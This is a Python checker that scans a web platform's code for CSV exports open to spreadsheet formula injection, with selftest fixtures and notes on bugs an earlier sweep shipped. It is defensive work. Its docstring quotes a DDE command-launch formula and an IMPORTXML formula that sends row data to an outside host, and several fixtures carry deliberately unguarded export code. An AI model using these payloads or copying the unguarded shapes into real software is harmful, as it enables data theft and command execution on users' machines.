"""csv_formula_injection_check.py -- does every CSV cell on this platform pass
through a guard, and does every guard still carry one?

    python tools/csv_formula_injection_check.py
    python tools/csv_formula_injection_check.py --selftest
    python tools/csv_formula_injection_check.py --json

Report only. Nothing gates on this yet.

── WHAT IT IS LOOKING FOR ────────────────────────────────────────────────────
Excel, LibreOffice Calc and Google Sheets execute a cell whose first character
is `=`, `+`, `-` or `@` as a FORMULA when the file is opened. `=cmd|'/c calc'!A0`
is a DDE launch; `=IMPORTXML("http://x/"&A1,"//a")` exfiltrates the row beside
it. The surrounding CSV quotes do NOT prevent any of it -- the importer strips
them as syntax and then evaluates what is inside.

On 2026-09-17 this pattern existed in 13 files and 53 places on this platform,
as one inline one-liner copied over and over:

    '"' + String(c).replace(/"/g, '""') + '"'

── THREE THINGS IT CHECKS, AND THEY FAIL DIFFERENTLY ───────────────────────
  1. A RAW CELL CONSTRUCTION anywhere outside a guard helper. That is an
     unguarded export path.
  2. A GUARD HELPER whose body no longer contains the guard. That is worse,
     because every call site still reads as covered.
  3. A CALL TO A HELPER THAT IS NOT DEFINED. That is WORST, and it was added
     on 2026-09-18 because the sweep this file was written to verify SHIPPED
     TWO OF THEM. Where the original read `{return'"'+String(x||'')...}` with
     no space after `return`, replacing the quoted expression glued the
     keyword to the new call -- `{returnsbCsvCell(x);}` -- which is a call to
     an undefined function. The export does not lose its guard, IT THROWS.
     Nothing caught it: `node --check` passes on a valid expression
     statement, the raw count correctly went to zero, and this file reported
     the app GUARDED. Three checks agreeing, none of them asking whether the
     NEW code was reachable. A fourth signal comes free -- the helper is then
     declared and never called.

── WHY IT ACCEPTS TWO GUARD SHAPES ─────────────────────────────────────────
`sairnroofing.html`'s rfCsvCell() was written with a guard BEFORE this sweep and
it is STRICTER than the platform rule: it exempts `-` only for plain decimals,
so `-1e5` is forced to text, and it does not exempt `+` at all. That is the safe
direction, and rewriting a working security control to match a house style is
how a sweep introduces a regression -- so it is accepted as GUARDED rather than
normalised.

THIS IS NOT A COURTESY. `tools/sabotage_control_check.py` scored five
well-written controls as unguarded in September because it recognised one guard
shape and they used a stronger one -- a probe that did the harder thing scored
worse, and the signal was inverted. The same mistake here would report the one
app that got this right before anybody asked as the one app that got it wrong.

── THE BLIND LOCK ───────────────────────────────────────────────────────────
Criteria are locked against synthetic fixtures in BOTH directions before any
real file is read, including a fixture for the stricter shape, because that is
precisely the arm whose absence inverted the other tool.
"""
import io
import json
import os
import re
import sys

CRITERIA_VERSION = '2026-09-18.2'   # third check: unreachable call sites
#                                     fourth check: the SINK pass

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# A quoted cell built by hand: '"' + <expr>.replace(/"/g,'""') ...
# The trailing `+ '"'` is deliberately NOT required. The first version of this
# pattern demanded it and MISSED 3 OF 39 SITES IN stonedesk.html -- the three
# that wrapped the inner expression in parentheses, `'"' + (String(c||'')
# .replace(...)) + '"'`. Three sites in the one file being audited, invisible to
# the audit. That is the whole argument for this file existing instead of a grep.
RAW = re.compile(r"""['"]"['"]\s*\+\s*\(?\s*(?:String\(|[A-Za-z_$][\w.$]*)"""
                 r"""[^;]{0,60}?\.replace\(/"/g\s*,\s*['"]""['"]\)""", re.S)

# A function whose name ends in CsvCell / CsvField -- the naming convention the
# sweep established, and what makes "is every site covered" a grep rather than a
# reading exercise.
HELPER_DECL = re.compile(
    r'function\s+([A-Za-z_$][\w$]*(?:CsvCell|CsvField)|csvCell)\s*\(')

# The platform guard: the dangerous class, tested against the head of the cell.
GUARD_CLASS = re.compile(r'/\^\[[^\]]*=[^\]]*\+[^\]]*@[^\]]*\]/')
# The stricter roofing shape: `=+@` plus a separately-handled `-`.
GUARD_SPLIT = re.compile(r"/\^\[[^\]]*=[^\]]*\+[^\]]*@[^\]]*\]/.*?/\^-/", re.S)
# The apostrophe that forces text. Required either way -- a class test that
# does not then prefix anything is a check with no effect.
APOSTROPHE = re.compile(r"""=\s*["']\\?'["']\s*\+""")


def scan_text(src):
    """Return (raw_sites, helpers) for one file's source.

    helpers is a list of (name, guarded, reason).
    """
    helper_lines = {}
    for m in HELPER_DECL.finditer(src):
        a = src.rfind('\n', 0, m.start()) + 1
        b = src.find('\n', m.end())
        # A one-line helper is the shape the sweep inserted; a multi-line one is
        # the hand-written kind. Take up to 14 lines so both are covered without
        # swallowing the next function.
        body = src[a:b]
        if body.count('{') > body.count('}'):
            end = a
            for _ in range(14):
                end = src.find('\n', end + 1)
                if end < 0:
                    break
                body = src[a:end]
                if body.count('{') <= body.count('}'):
                    break
        helper_lines[m.group(1)] = (a, a + len(body), body)

    # A GUARD FACTORED INTO A NAMED CONSTANT IS BETTER CODE AND MUST NOT SCORE
    # WORSE. api/_lib/csv-cell.js writes `const DANGEROUS = /^[=+\-@\t\r]/` and
    # then `DANGEROUS.test(s)`, and the first version of this file reported the
    # one module that got the factoring right as the only unguarded helper on
    # the platform -- the same inversion recorded against sabotage_control_check
    # in September, reproduced here within the hour by somebody who had just
    # written a paragraph about it.
    named = set()
    for m in re.finditer(r'(?:const|let|var)\s+([A-Z_][A-Z0-9_]*)\s*=\s*(/\^\[[^\]]+\]/)',
                         src):
        if GUARD_CLASS.search(m.group(2)):
            named.add(m.group(1))

    helpers = []
    for name, (a, b, body) in sorted(helper_lines.items()):
        has_class = (bool(GUARD_CLASS.search(body)) or bool(GUARD_SPLIT.search(body))
                     or any(re.search(r'\b' + n + r'\s*\.test\s*\(', body)
                            for n in named))
        has_quote = bool(APOSTROPHE.search(body))
        delegates = re.search(r'return\s+[A-Za-z_$][\w$]*(?:CsvCell|CsvField)\s*\(', body)
        if has_class and has_quote:
            helpers.append((name, True, 'guard present'))
        elif delegates:
            helpers.append((name, True, 'delegates to ' + delegates.group(0)
                            .replace('return ', '').replace('(', '')))
        else:
            why = []
            if not has_class:
                why.append('no leading =/+/@ class test')
            if not has_quote:
                why.append("never prefixes an apostrophe")
            helpers.append((name, False, ' and '.join(why)))

    raw = []
    spans = [(a, b) for (a, b, _body) in helper_lines.values()]
    for m in RAW.finditer(src):
        # A construction INSIDE a named helper's BODY is that helper's own
        # quoting, and the helper already has a guarded/unguarded verdict of its
        # own -- counting it again here would report one defect twice and, worse,
        # would report the FIX as a finding.
        #
        # SUPPRESSED BY RANGE, NOT BY LINE. The first version asked whether the
        # construction's own LINE contained `function <name>`, which is true only
        # of a one-line helper -- so every MULTI-LINE helper (the hand-written
        # kind, which is where the real defects were) had its body counted as a
        # raw site. Two of the seven fixtures caught it, which is the whole
        # reason the lock runs before any real file.
        if any(a <= m.start() < b for a, b in spans):
            continue
        a = src.rfind('\n', 0, m.start()) + 1
        line = src[a:src.find('\n', m.end())]
        # A COMMENT IS NOT AN EXPORT PATH. api/_lib/csv-cell.js quotes the
        # defective expression in its own header to say what the defect was, and
        # reporting that as a finding would make the file documenting the fix the
        # worst-scoring file in the sweep. Crude but honest: the construction has
        # to be the code on its line, not inside a `//` that precedes it.
        stripped = line.lstrip()
        if stripped.startswith('//') or stripped.startswith('*'):
            continue
        cut = line.find('//')
        if 0 <= cut < (m.start() - a):
            continue
        raw.append((src[:m.start()].count('\n') + 1, ' '.join(line.split())[:110]))
    # ── THE THIRD CHECK, AND MY OWN SWEEP IS WHY IT EXISTS (2026-09-18) ─────
    # The 2026-09-17 sweep replaced 53 inline constructions with calls to a
    # named helper. In two files the original read `{return'"'+String(x||'')...}`
    # with NO SPACE after `return`, and replacing only the quoted expression
    # glued the keyword to the new call:
    #
    #     {return'"'+String(x||'')...}   ->   {returnsbCsvCell(x);}
    #
    # That is a call to an UNDEFINED function. It throws a ReferenceError, so
    # the export does not merely lose its guard -- IT DOES NOT RUN AT ALL.
    #
    # NOTHING I BUILT COULD SEE IT, AND THAT IS THE POINT. `node --check` on
    # every script block PASSED, because `returnsbCsvCell(x);` is a perfectly
    # valid expression statement. The raw-construction count went to ZERO,
    # correctly -- the construction really was gone. And this file reported both
    # apps GUARDED, because a helper existed and carried the guard. Three checks
    # agreeing, all three answering a question that was not the one that
    # mattered: I verified that the OLD code was gone and never that the NEW
    # code was reachable.
    #
    # Found by cody, on my work, the morning after. Reported as its own state
    # because it is WORSE than a raw construction: an unguarded export still
    # produces a file.
    defined = set(re.findall(
        r'(?:function\s+|(?:var|let|const)\s+)([A-Za-z_$][\w$]*'
        r'(?:CsvCell|CsvField))\b', src))
    defined |= set(re.findall(r'require\([^)]*\)\.(\w*[Cc]svCell)\b', src))
    defined |= set(re.findall(r'\bconst\s*\{[^}]*\b(csvCell|csvRow)\b', src))
    unreachable = []
    for m in re.finditer(r'\b([A-Za-z_$][\w$]*(?:CsvCell|CsvField))\s*\(', src):
        name = m.group(1)
        if name in defined:
            continue
        a = src.rfind('\n', 0, m.start()) + 1
        unreachable.append((src[:m.start()].count('\n') + 1, name,
                            ' '.join(src[a:src.find('\n', m.end())].split())[:96]))

    # AND THE INVERSE: a file that declares a guard helper and never calls it.
    # That is a sweep that inserted the helper and replaced nothing, which would
    # also show zero raw constructions and a guarded helper.
    orphan = []
    for name, _g, _w in helpers:
        calls = len(re.findall(r'\b' + re.escape(name) + r'\s*\(', src))
        # The declaration itself matches, so one occurrence means zero calls.
        if calls <= 1 and not re.search(r'=\s*' + re.escape(name) + r'\b', src):
            orphan.append(name)

    return raw, helpers, unreachable, orphan


# ── THE FOURTH CHECK: THE SINK PASS (2026-09-18, cody) ──────────────────────
# The three checks above all ask about a CONSTRUCTION or a HELPER -- something
# this file has to RECOGNISE first. Its own closing paragraph has always named
# the cost: "an export written with a CSV library, a template, or Array.join on
# unquoted values is INVISIBLE to it -- and an export with no quoting at all is
# invisible twice over, because there is no .replace to match."
#
# THAT WAS NOT ABOUT THE FUTURE. On 2026-09-18, with this file reporting 0 raw
# constructions and 0 unguarded helpers across all 13 files, stonedesk.html held
# SEVEN live export paths none of the three checks could see, six of them
# wrapping cells in bare quotes with no `.replace` (so there was no token to
# match) and one -- crExportCSV -- emitting `[a,b,c].join(',')` with no quoting
# at all. Customer names, employee names, OSHA incident records.
#
# SO THIS ASKS THE QUESTION THAT NEEDS NOTHING RECOGNISED: is every place a CSV
# actually LEAVES the app reached by a guard? The sink is the media type
# `text/csv`, which a Blob and a data: URI both carry and a file INPUT
# (`accept=".csv"`) does not -- which is why it is the media type and not the
# extension.
#
# IT IS A POINTER, NOT A VERDICT, AND THE WINDOW IS WHY. "Reached" is
# SINK_WINDOW characters of source text before the sink, not a call graph. A
# guard applied in a helper defined far away is a false alarm here; a guard
# named only in a nearby COMMENT is a false clear. Both directions are arms in
# the lock, so neither is a surprise to whoever reads the output.
SINK = re.compile(r'text/csv')
SINK_WINDOW = 2500
# The prefix is OPTIONAL and that is not cosmetic: api/_lib/csv-cell.js names
# its helpers `csvCell` and `csvRow` with nothing in front, and a required
# prefix reported the one module that exports the shared guard as unreached --
# the same inversion HELPER_DECL already carries an explicit `|csvCell` for.
GUARD_CALL = re.compile(r'\b[A-Za-z_$][\w$]*[Cc]sv(?:Cell|Field|Row)\s*\('
                        r'|\bcsv(?:Cell|Field|Row)\s*\(')
# AN ALIASED GUARD IS STILL A GUARD. sairnvet.html writes `var q = svCsvCell;`
# and then calls `q(cell.textContent)` -- shorter code in a long export, and
# genuinely guarded. Without this the pass reported both SAIRNvet exports as
# unreached, which is the cry-wolf direction, and the FIRST version of this
# pass did exactly that on its first real run.
ALIAS_DECL = re.compile(r'(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*'
                        r'([A-Za-z_$][\w$]*[Cc]sv(?:Cell|Field|Row)|'
                        r'csv(?:Cell|Field|Row))\s*[;,\n]')

# DECLARED EXEMPTIONS, EACH WITH THE SENTENCE THAT PUT IT THERE, and the
# sentence is PRINTED. A list of bare names is where a real finding goes to be
# forgotten -- the same reason `--rule not-citable` in the defect register
# demands a note rather than accepting a bare refusal.
SINK_EXEMPT = {
    'sairnroofing.html': 'rfGlDownload() streams a CSV built SERVER-SIDE by '
                         'api/_lib/roofing-gl-export.js, which is guarded and '
                         'has its own suite; the client never builds a cell.',
}


def enclosing(src, pos):
    """Name of the nearest preceding function declaration, or ''."""
    m = None
    for f in re.finditer(r'\bfunction\s+([A-Za-z_$][\w$]*)\s*\(', src[:pos]):
        m = f
    return m.group(1) if m else ''


def scan_sinks(src):
    """[(line, function_name, context)] for CSV sinks with no guard call in the
    window. Sinks within 400 chars are one export path, counted once."""
    aliases = set(m.group(1) for m in ALIAS_DECL.finditer(src))
    alias_call = (re.compile(r'\b(?:%s)\s*\('
                             % '|'.join(sorted(map(re.escape, aliases))))
                  if aliases else None)
    out, last = [], -10 ** 9
    for m in SINK.finditer(src):
        if m.start() - last <= 400:
            last = m.start()
            continue
        last = m.start()
        back = src[max(0, m.start() - SINK_WINDOW):m.start()]
        if GUARD_CALL.search(back):
            continue
        if alias_call and alias_call.search(back):
            continue
        line = src[:m.start()].count('\n') + 1
        ctx = ' '.join(src[max(0, m.start() - 90):m.start() + 20].split())
        out.append((line, enclosing(src, m.start()), ctx[-100:]))
    return out


# ── THE BLIND LOCK ──────────────────────────────────────────────────────────
FIXTURES = [
    ('an UNGUARDED inline cell is a raw site',
     """var csv=rows.map(function(r){return r.map(function(c){"""
     """return '"'+String(c).replace(/"/g,'""')+'"';}).join(',');});""",
     1, []),

    ('the PARENTHESISED variant is a raw site too -- the 3 of 39 a tighter '
     'pattern missed in the file it was auditing',
     """return '"' + (String(c || '').replace(/"/g, '""')) + '"';""",
     1, []),

    ('the platform guard reads as GUARDED',
     """function sdCsvCell(v){var s=v==null?'':String(v);"""
     """if(/^[=+\\-@\\t\\r]/.test(s)&&!(s!==''&&isFinite(Number(s))))s="'"+s;"""
     """return '"'+s.replace(/"/g,'""')+'"';}""",
     0, [('sdCsvCell', True)]),

    ('THE STRICTER ROOFING SHAPE READS AS GUARDED -- this is the arm whose '
     'absence inverted sabotage_control_check in September',
     """function rfCsvCell(v){
  var s=String(v);
  if(/^[=+@\\t\\r]/.test(s)||(/^-/.test(s)&&!/^-?\\d+(\\.\\d+)?$/.test(s)))s="'"+s;
  if(/[",\\n\\r]/.test(s))s='"'+s.replace(/"/g,'""')+'"';
  return s;
}""",
     0, [('rfCsvCell', True)]),

    ('a helper that TESTS the class and never prefixes anything is UNGUARDED '
     "-- a check with no effect is not a guard",
     """function xxCsvCell(v){var s=String(v);"""
     """if(/^[=+\\-@\\t\\r]/.test(s)){/* TODO */}"""
     """return '"'+s.replace(/"/g,'""')+'"';}""",
     0, [('xxCsvCell', False)]),

    ('a CONDITIONAL quoter with no guard is UNGUARDED -- and this is the shape '
     'that emitted the cell completely BARE',
     """function alfCsvField(v){
  var t=String(v==null?'':v);
  if(/[",\\n\\r]/.test(t))return '"'+t.replace(/"/g,'""')+'"';
  return t;
}""",
     0, [('alfCsvField', False)]),

    ('a helper that DELEGATES to a guarded one reads as GUARDED',
     """function dntCsvField(v){
  return dntCsvCell(v);
}""",
     0, [('dntCsvField', True)]),

    ('A GUARD FACTORED INTO A NAMED CONSTANT READS AS GUARDED. Without this '
     'arm the one module that got the factoring right scored as the only '
     'unguarded helper on the platform -- and it did, for about ten minutes',
     """const DANGEROUS = /^[=+\\-@\\t\\r]/;
function csvCell(v) {
  let s = v == null ? '' : String(v);
  if (DANGEROUS.test(s) && !looksNumeric(s)) s = "'" + s;
  return '"' + s.replace(/"/g, '""') + '"';
}""",
     0, [('csvCell', True)]),
]

# The SINK pass gets its own lock, in both directions, for the same reason the
# passes above have one: criteria fixed against synthetic fixtures BEFORE any
# real file is read. The first two are REAL shapes that stood in stonedesk.html
# while this file reported the platform clean.
SINK_FIXTURES = [
    ('THE REAL ONE: bare quotes, no .replace -- invisible to the RAW pattern '
     'because there is no token for it to match',
     """function invExportCSV(){
  var csv = rows.map(function(r){ return r.map(function(c){ return '"'+(c||'')+'"'; }).join(','); }).join('\\n');
  a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
}""",
     1, 'invExportCSV'),

    ('THE ONE INVISIBLE TWICE OVER: no quoting at all, so there is no .replace '
     'AND no quote pair',
     """function crExportCSV(){
  var csv = 'Date,Payee\\n' + arr.map(function(e){ return [e.date,e.payee].join(','); }).join('\\n');
  a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
}""",
     1, 'crExportCSV'),

    ('CONTROL: a sink reached by a guard helper is NOT reported -- without this '
     'arm the pass flags every export on the platform and means nothing',
     """function okExportCSV(){
  var csv = rows.map(function(r){ return r.map(function(x){ return sdCsvCell(x); }).join(','); }).join('\\n');
  var bl = new Blob([csv], {type:'text/csv'});
}""",
     0, ''),

    ('CONTROL: a *CsvRow helper counts as a guard call too, so factoring the '
     'row out does not score worse than inlining the cell',
     """function rowExportCSV(){
  var csv = rows.map(function(r){ return csvRow(r); }).join('\\n');
  var bl = new Blob([csv], {type:'text/csv'});
}""",
     0, ''),

    ('CONTROL: a file INPUT is not an export. accept=".csv" carries the '
     'extension and NOT the media type, which is why the sink is text/csv',
     """<input type="file" accept=".csv" onchange="importRows(event)">""",
     0, ''),

    ('CONTROL: an ALIASED guard is still a guard. sairnvet.html writes '
     '`var q = svCsvCell;` and calls q() -- the first version of this pass '
     'reported both its exports as unreached, which is the cry-wolf direction',
     """function svExportDoseAudit(){
  var q = svCsvCell;
  table.querySelectorAll('tr').forEach(function(row){ rowData.push(q(row.textContent)); });
  var blob = new Blob([csv], {type:'text/csv'});
}""",
     0, ''),

    ('CONTROL: an alias to something that is NOT a guard does not launder it -- '
     'otherwise any `var q = f;` in the window would silence the pass',
     """function badExportCSV(){
  var q = escapeHtml;
  rowData.push(q(row.textContent));
  var blob = new Blob([csv], {type:'text/csv'});
}""",
     1, 'badExportCSV'),

    ('THE FALSE CLEAR THIS PASS CAN GIVE, RECORDED RATHER THAN HIDDEN: a guard '
     'named only in a COMMENT satisfies the window. The pass is a pointer, not '
     'a verdict, and this arm is what stops that sentence being decoration',
     """function sneakyExportCSV(){
  // sdCsvCell( is deliberately NOT used here, see note
  var csv = rows.map(function(r){ return r.join(','); }).join('\\n');
  var bl = new Blob([csv], {type:'text/csv'});
}""",
     0, ''),
]


def selftest():
    ok = True

    def check(name, cond, detail=''):
        nonlocal ok
        print('  %-4s %s%s' % ('ok' if cond else 'FAIL', name,
                               '' if cond else '   <- ' + str(detail)))
        if not cond:
            ok = False

    print('CSV FORMULA INJECTION CHECK -- selftest, criteria %s' % CRITERIA_VERSION)
    print('\n1. the blind lock: criteria fixed against synthetic fixtures in BOTH')
    print('   directions BEFORE any real file is read')
    for name, src, want_raw, want_helpers in FIXTURES:
        raw, helpers, _unre, _orph = scan_text(src)
        check('%-3d raw  %s' % (len(raw), name), len(raw) == want_raw,
              'expected %d raw, got %d' % (want_raw, len(raw)))
        got = dict((n, g) for n, g, _ in helpers)
        for hn, hg in want_helpers:
            check('     %s -> %s' % (hn, 'GUARDED' if hg else 'UNGUARDED'),
                  got.get(hn) == hg, 'got %r' % (got.get(hn),))

    # ── THE THIRD CHECK, LOCKED IN BOTH DIRECTIONS (2026-09-18) ────────────
    # These fixtures exist because the real defect they describe passed every
    # check on this platform: node --check on the script block, a raw-site
    # count of zero, and this file reporting the app GUARDED. Three green
    # answers to questions that were not the one that mattered.
    print('\n1b. the UNREACHABLE call site -- the defect my own sweep shipped')
    GLUED = (
        "function sbCsvCell(v){var s=v==null?'':String(v);"
        "if(/^[=+\\-@]/.test(s))s=\"'\"+s;"
        "return '\"'+s.replace(/\"/g,'\"\"')+'\"';}\n"
        "var c=rows.map(function(r){return r.map(function(x){"
        "returnsbCsvCell(x);}).join(',');});\n")
    WIRED = GLUED.replace('returnsbCsvCell(x);', 'return sbCsvCell(x);')
    _r, _h, unre, orph = scan_text(GLUED)
    check('a keyword glued to the call is UNREACHABLE', len(unre) == 1, unre)
    check('...and it names the undefined identifier, not the helper',
          bool(unre) and unre[0][1] == 'returnsbCsvCell', unre)
    check('...and the helper is ALSO reported as never called -- two '
          'independent signals on one defect', orph == ['sbCsvCell'], orph)
    check('CONTROL: zero raw constructions either way, which is exactly why '
          'the raw count could not see this', len(_r) == 0, _r)
    _r2, _h2, unre2, orph2 = scan_text(WIRED)
    check('the SAME source with the space restored is clean',
          not unre2 and not orph2, (unre2, orph2))
    check('CONTROL: the two differ -- without this both arms would pass on a '
          'predicate that never fires', (len(unre) > 0) != (len(unre2) > 0))

    print('\n1c. the SINK lock: is every place a CSV LEAVES the app reached by')
    print('    a guard -- the question that needs no construction to be')
    print('    recognisable, in both directions')
    for name, src, want, want_fn in SINK_FIXTURES:
        got = scan_sinks(src)
        check('%-3d sink %s' % (len(got), name), len(got) == want,
              'expected %d, got %d: %r' % (want, len(got), got))
        if want and got:
            check('     ...and it names the function: %s' % want_fn,
                  got[0][1] == want_fn, 'got %r' % (got[0][1],))

    print('\n2. the counter can tell the FIX from the DEFECT')
    # The first version of the sweep script counted the helper it had just
    # inserted as a raw site, so every fixed file reported the same number
    # before and after -- a checker that cannot tell them apart proves nothing.
    guarded = FIXTURES[2][1]
    raw, _h, _u, _o = scan_text(guarded)
    check('a file containing ONLY the guard has zero raw sites', len(raw) == 0, raw)

    print('\n' + ('  all arms pass' if ok else '  ARMS FAILED'))
    return 0 if ok else 2


TARGETS = ['*.html', os.path.join('api', '**', '*.js')]


def targets():
    import glob
    out = []
    for pat in TARGETS:
        for p in glob.glob(os.path.join(REPO, pat), recursive=True):
            rel = os.path.relpath(p, REPO)
            if 'node_modules' in rel or rel.startswith('archive'):
                continue
            if rel.endswith('.test.js'):
                continue
            out.append(rel)
    return sorted(set(out))


def main(argv):
    if '--selftest' in argv:
        return selftest()
    rows = []
    for rel in targets():
        try:
            src = io.open(os.path.join(REPO, rel), encoding='utf-8',
                          errors='replace').read()
        except OSError as e:
            print('COULD NOT READ %s (%s) -- counted as neither clean nor '
                  'dirty' % (rel, e))
            return 2
        raw, helpers, unreachable, orphan = scan_text(src)
        sinks = [] if rel in SINK_EXEMPT else scan_sinks(src)
        if raw or helpers or unreachable or sinks:
            rows.append({'file': rel, 'raw': raw, 'helpers': helpers,
                         'unreachable': unreachable, 'orphan': orphan,
                         'sinks': sinks})

    if '--json' in argv:
        print(json.dumps({'criteria_version': CRITERIA_VERSION, 'files': rows},
                         indent=1))
        return 1 if any(r['raw'] or r.get('unreachable') or r.get('sinks')
                        or [h for h in r['helpers'] if not h[1]]
                        for r in rows) else 0

    print('CSV FORMULA INJECTION CHECK -- criteria %s, report only'
          % CRITERIA_VERSION)
    st = selftest_quiet()
    print('  blind lock: %s' % st)
    nraw = sum(len(r['raw']) for r in rows)
    nunre = sum(len(r.get('unreachable') or []) for r in rows)
    norph = sum(len(r.get('orphan') or []) for r in rows)
    bad = [(r['file'], h) for r in rows for h in r['helpers'] if not h[1]]
    print('  files with a CSV cell path : %d' % len(rows))
    print('  RAW cell constructions     : %d   <- an unguarded export path' % nraw)
    print('  guard helpers              : %d' % sum(len(r['helpers']) for r in rows))
    print('  helpers WITHOUT a guard    : %d   <- worse: the call sites still '
          'read as covered' % len(bad))
    print('  UNREACHABLE helper calls   : %d   <- WORST: the export does not '
          'run at all' % nunre)
    print('  helpers never called       : %d   <- a sweep that inserted a guard '
          'and replaced nothing' % norph)
    nsink = sum(len(r.get('sinks') or []) for r in rows)
    print('  SINKS with no guard nearby : %d   <- a CSV leaving the app by a '
          'path no guard reaches' % nsink)
    print('')
    for r in rows:
        marks = ['%s %s' % ('GUARDED  ' if g else '*** NO GUARD', n)
                 for n, g, _ in r['helpers']]
        print('  %-24s %s' % (r['file'], '; '.join(marks) or '-'))
        for line, text in r['raw']:
            print('      *** RAW  L%-7d %s' % (line, text))
        for line, nm, text in (r.get('unreachable') or []):
            print('      *** UNREACHABLE  L%-7d %s -- NOT DEFINED, so this '
                  'export throws' % (line, nm))
            print('          %s' % text)
        for nm in (r.get('orphan') or []):
            print('      *** NEVER CALLED  %s -- a guard nothing routes '
                  'through' % nm)
        for n, g, why in r['helpers']:
            if not g:
                print('      *** %s : %s' % (n, why))
        for line, fname, ctx in (r.get('sinks') or []):
            print('      *** SINK L%-6d %s()  %s'
                  % (line, fname or '<top level>', ctx))
    if SINK_EXEMPT:
        print('')
        print('  SINKS DECLARED EXEMPT, WITH THE REASON, because a list of bare')
        print('  names is where a real finding goes to be forgotten:')
        for f, why in sorted(SINK_EXEMPT.items()):
            print('    %-24s %s' % (f, why))
    print('')
    print('  FOUR CHECKS, TWO QUESTIONS, AND THEY FAIL DIFFERENTLY.')
    print('  Checks 1-3 ask about something this file has to RECOGNISE -- a')
    print('  construction, a helper, a call. They find cells built by the')
    print('  string-concatenation shape this platform uses, and an export')
    print('  written with a CSV library, a template, or Array.join on unquoted')
    print('  values is INVISIBLE to them -- invisible twice over with no')
    print('  quoting at all, because there is no .replace to match. That is')
    print('  not hypothetical: SEVEN live export paths in stonedesk.html stood')
    print('  through the 2026-09-17 sweep AND through this file reporting the')
    print('  platform clean, until the sink pass was added on 2026-09-18.')
    print('  Check 4 asks whether every place a CSV LEAVES the app is reached')
    print('  by a guard, which needs nothing recognised. Its own limit:')
    print('  "reached" is %d characters of source TEXT, not a call graph. A'
          % SINK_WINDOW)
    print('  guard defined far away is a false alarm here; a guard named only')
    print('  in a nearby COMMENT is a false clear. Both are arms in the lock.')
    print('  A SINK line is a pointer at an export path worth reading.')
    return 1 if (nraw or bad or nunre or norph or nsink) else 0


def selftest_quiet():
    import io as _io
    import contextlib
    buf = _io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = selftest()
    txt = buf.getvalue()
    n = txt.count('  ok ')
    return ('%d/%d fixtures correct' % (n, n) if rc == 0
            else 'FAILED -- criteria are not locked, nothing below is trustworthy')


if __name__ == '__main__':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8',
                                  errors='replace')
    sys.exit(main(sys.argv[1:]))
